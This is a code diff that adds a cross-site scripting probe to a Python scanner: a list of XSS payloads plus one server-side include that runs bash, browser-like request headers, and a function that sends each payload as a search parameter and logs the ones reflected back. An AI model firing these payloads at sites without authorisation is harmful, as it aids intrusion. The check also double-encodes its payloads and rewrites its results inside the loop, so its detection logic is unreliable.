@@ -1,4 +1,4 @@
-from urllib.parse import urljoin
+import urllib.parse
 import requests
 from requests.exceptions import RequestException
 import threading
@@ -24,6 +24,64 @@ USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 12.3; en-US; rv:90.0) Gecko/20100101 Firefox/90.0"
 ]
 
+PAYLOADS = [
+    '<script>alert("XSS Attack")</script>',
+    '<img src="x" onerror="alert(\'XSS Attack\')">',
+    '<a href="javascript:alert(\'XSS Attack\')">Click Here</a>',
+    "<svg/onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<input type='text' value='XSS' onfocus='alert(\"XSS\");'>",
+    "<details open ontoggle=alert('XSS')>",
+    "<marquee onstart=alert('XSS')>XSS Test</marquee>",
+    "<table background='javascript:alert(\"XSS\")'>",
+    "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+    "<img src=x onerror=prompt('XSS')>",
+    "<object data='javascript:alert(\"XSS\")'></object>",
+    "<audio src='javascript:alert(\"XSS\")'></audio>",
+    "<video src='javascript:alert(\"XSS\")'></video>",
+    "<div style=width:expression(alert('XSS'))>XSS</div>",
+    "'><script>alert(\"XSS\")</script>",
+    "'\"><img src=x onerror=alert(\"XSS\")>",
+    "`<script>alert(\"XSS\")</script>`",
+    "<!--#exec cmd=\"/bin/bash -c 'echo XSS'\"-->",
+    "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"  
+]
+
 def user_agent():
-    return random.choice(USER_AGENTS)
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "keep-alive"
+    }
+
+def check_xss(url):
+    vulnerable = []
+
+    for payload in PAYLOADS:
+        encoded_payload = urllib.parse.quote(payload)
+
+        try:
+            response = requests.get(url, params={'search': encoded_payload}, headers=user_agent(), timeout=10)
+
+            if payload in response.text:
+                logging.info(f"[+] XSS Vulnerability found at {url} with payload: {payload}")
+                vulnerable.append(payload)
+        
+        except RequestException as e:
+            logging.error(f"[!] Error during XSS check on {url}: {e}")
+
+        if vulnerable:
+            with open("xss_results.txt", "a") as file:
+                file.write(f"Vulnerable URL: {url}\n")
+                file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
+            logging.info("[+] Results saved to xss_results.txt")
+
+
+
+
+
+
 
